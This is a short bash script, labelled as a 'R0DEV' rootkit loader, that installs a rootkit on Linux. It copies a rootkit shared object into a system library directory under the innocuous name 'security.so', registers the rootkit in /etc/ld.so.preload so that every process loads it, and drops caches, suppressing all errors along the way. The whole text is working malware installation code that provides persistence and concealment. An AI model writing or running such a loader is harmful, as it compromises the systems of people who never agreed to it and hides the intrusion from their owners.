#!/bin/bash
# R0DEV loader — rootkit + watchdog
ROOTKIT_SO="/opt/R0DEV/rootkit.so"
SO_DST="/lib/x86_64-linux-gnu/security.so"

cp "$ROOTKIT_SO" "$SO_DST" 2>/dev/null
echo "$ROOTKIT_SO" > /etc/ld.so.preload 2>/dev/null
echo 3 > /proc/sys/vm/drop_caches 2>/dev/null
